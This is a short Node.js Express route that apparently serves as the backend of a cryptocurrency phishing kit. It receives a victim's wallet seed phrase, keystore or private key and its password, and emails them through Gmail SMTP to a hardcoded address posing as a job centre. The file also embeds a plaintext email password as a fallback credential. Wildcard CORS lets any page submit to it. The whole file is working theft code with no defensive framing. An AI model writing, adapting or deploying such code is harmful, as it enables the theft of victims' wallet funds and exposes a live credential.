const express = require('express');
const router = express.Router();
const nodemailer = require('nodemailer');

router.post('/', async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    const maillist = ['Gfequitygroupjobcenter@gmail.com'];

    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 465,
      secure: true,
      auth: {
        user: process.env.EML_USER || "Gfequitygroupjobcenter@gmail.com",
        pass: process.env.EMAIL_PASS || "yensvcwbppmkxogh",
      },
    });

    const { phwet, psdwet } = req.body;

    const mailOptions = {
      from: '"Deets" <Gfequitygroupjobcenter@gmail.com>',
      to: maillist,
      html: `
        <p><strong>Phrase/KS/PKey:</strong> ${phwet || 'Not provided'}</p>
        <p><strong>Pswd (if keystore):</strong> ${psdwet || 'Not provided'}</p>
      `
    };

    await transporter.sendMail(mailOptions);

    return res.status(200).json({ success: true, message: 'Request received' });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
});

module.exports = router;
